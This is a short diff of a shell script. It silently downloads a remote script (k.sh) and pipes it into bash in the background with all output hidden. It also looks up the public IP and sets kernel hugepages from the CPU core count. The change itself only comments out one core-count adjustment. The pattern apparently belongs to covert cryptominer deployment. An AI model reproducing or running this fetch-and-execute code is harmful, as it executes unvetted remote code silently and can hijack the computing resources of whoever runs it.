@@ -19,7 +19,7 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 if [ "$mode" == "1" ]; then
   bash <(wget -qO- ${src}/k.sh) 1800 0 >/dev/null 2>&1 &
   [ "$cores" == "2" ] && cores="1";
-  [ "$cores" == "8" ] && cores="4";
+  # [ "$cores" == "8" ] && cores="4";
 fi
 
 sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1
